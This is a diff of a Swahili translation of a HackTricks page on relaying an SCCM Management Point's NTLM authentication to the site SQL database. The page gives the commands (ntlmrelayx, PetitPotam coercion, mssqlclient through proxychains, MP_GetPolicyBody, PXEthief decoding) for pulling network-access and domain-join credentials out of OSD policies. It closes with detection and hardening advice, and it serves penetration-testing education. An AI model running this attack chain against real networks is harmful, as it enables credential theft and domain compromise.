@@ -3,12 +3,12 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kuthibitisha kupitia SMB/RPC na **kupeleka** akaunti ya mashine ya NTLM kwa **hifadhidata ya tovuti (MSSQL)** unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Hizi ni nafasi zinazokuruhusu kuita seti ya taratibu zilizohifadhiwa zinazofichua **Operating System Deployment (OSD)** blobs (akili za Akaunti ya Upataji wa Mtandao, mabadiliko ya Mchakato, nk.). Blobs zimeandikwa kwa hex/encrypted lakini zinaweza kufichuliwa na kufichuliwa kwa **PXEthief**, zikitoa siri za maandiko.
+Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kuthibitisha kupitia SMB/RPC na **kupeleka** akaunti ya mashine ya NTLM kwa **hifadhi ya tovuti (MSSQL)** unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Hizi ni nafasi zinazokuruhusu kuita seti ya taratibu zilizohifadhiwa zinazofichua **Operating System Deployment (OSD)** blobs (akili za Akaunti ya Ufikiaji wa Mtandao, mabadiliko ya Mchakato, nk.). Blobs zimeandikwa kwa hex/encrypted lakini zinaweza kufichuliwa na kufichuliwa kwa **PXEthief**, zikitoa siri za maandiko.
 
 Mnyororo wa kiwango cha juu:
-1. Gundua MP & hifadhidata ya tovuti ↦ mwisho wa HTTP usio na uthibitisho `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+1. Gundua MP & hifadhi ya DB ↦ mwisho wa HTTP usio na uthibitisho `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Anza `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
-3. Lazimisha MP ukitumia **PetitPotam**, PrinterBug, DFSCoerce, nk.
+3. Lazimisha MP kwa kutumia **PetitPotam**, PrinterBug, DFSCoerce, nk.
 4. Kupitia proxy ya SOCKS ungana na `mssqlclient.py -windows-auth` kama akaunti ya **<DOMAIN>\\<MP-host>$** iliyopelekwa.
 5. Tekeleza:
 * `use CM_<SiteCode>`
@@ -25,9 +25,9 @@ Kiendelezi cha MP ISAPI **GetAuth.dll** kinatoa vigezo kadhaa ambavyo havihitaji
 
 | Parameter | Purpose |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | Inarudisha funguo ya umma ya cheti cha kusaini tovuti + GUIDs za vifaa vyote vya *x86* / *x64* **All Unknown Computers**. |
+| `MPKEYINFORMATIONMEDIA` | Inarudisha funguo ya umma ya cheti cha saini ya tovuti + GUIDs za vifaa vya *x86* / *x64* **All Unknown Computers**. |
 | `MPLIST` | Inataja kila Management-Point katika tovuti. |
-| `SITESIGNCERT` | Inarudisha cheti cha kusaini cha Tovuti Kuu (tambua seva ya tovuti bila LDAP). |
+| `SITESIGNCERT` | Inarudisha cheti cha saini ya Tovuti Kuu (tambua seva ya tovuti bila LDAP). |
 
 Pata GUIDs ambazo zitakuwa kama **clientID** kwa maswali ya DB baadaye:
 ```bash
@@ -52,7 +52,7 @@ Wakati shinikizo linapowaka unapaswa kuona kitu kama:
 ---
 
 ## 3. Tambua sera za OSD kupitia taratibu zilizohifadhiwa
-Unganisha kupitia proxy ya SOCKS (port 1080 kwa chaguo-msingi):
+Unganisha kupitia proxy ya SOCKS (bandari 1080 kwa chaguo-msingi):
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
@@ -73,19 +73,19 @@ Kila safu ina `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.
 
 Zingatia sera:
 * **NAAConfig**  – Akounti za mtandao za NAA
-* **TS_Sequence** – Mabadiliko ya kazi (OSDJoinAccount/Password)
+* **TS_Sequence** – Vigezo vya Mchakato wa Kazi (OSDJoinAccount/Password)
 * **CollectionSettings** – Inaweza kuwa na akaunti za run-as
 
 ### 3.3  Pata mwili kamili
-Ikiwa tayari una `PolicyID` & `PolicyVersion` unaweza kupuuza hitaji la clientID kwa kutumia:
+Ikiwa tayari una `PolicyID` & `PolicyVersion` unaweza kupuuzilia mbali hitaji la clientID kwa kutumia:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> MUHIMU: Katika SSMS ongeza "Idadi ya Wahusika Waliorejeshwa" (>65535) au blob itakatwa.
+> MUHIMU: Katika SSMS ongeza "Wahusika Wengi Waliorejeshwa" (>65535) au blob itakatwa.
 
 ---
 
-## 4. Fanya ufafanuzi na ufichuaji wa blob
+## 4. Fanya ufafanuzi na ufichue blob
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -115,7 +115,7 @@ Majukumu haya yanaonyesha idadi kubwa ya ruhusa za EXEC, zile muhimu zinazotumik
 | `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Rudisha mwili kamili wa sera. |
 | `MP_GetListOfMPsInSiteOSD` | Iliyorejeshwa na njia ya `MPKEYINFORMATIONMEDIA`. |
 
-Unaweza kuangalia orodha kamili na:
+Unaweza kuchunguza orodha kamili na:
 ```sql
 SELECT pr.name
 FROM   sys.database_principals AS dp
@@ -129,19 +129,21 @@ AND  pe.permission_name='EXECUTE';
 ## 6. Ugunduzi & Kuimarisha
 1. **Fuatilia logins za MP** – akaunti yoyote ya kompyuta ya MP inayoingia kutoka IP ambayo si mwenyeji wake ≈ relay.
 2. Wezesha **Ulinzi wa Kupanuliwa kwa Uthibitishaji (EPA)** kwenye hifadhidata ya tovuti (`PREVENT-14`).
-3. Zima NTLM zisizotumika, enforce SMB signing, punguza RPC (
+3. Zima NTLM zisizotumika, lazimisha saini ya SMB, punguza RPC (
 mipango sawa iliyotumika dhidi ya `PetitPotam`/`PrinterBug`).
-4. Imarisha mawasiliano ya MP ↔ DB kwa kutumia IPSec / mutual-TLS.
+4. Imarisha mawasiliano ya MP ↔ DB kwa kutumia IPSec / TLS ya pamoja.
 
 ---
 
 ## Tazama pia
 * Misingi ya NTLM relay:
+
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
 * Unyanyasaji wa MSSQL & baada ya unyanyasaji:
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
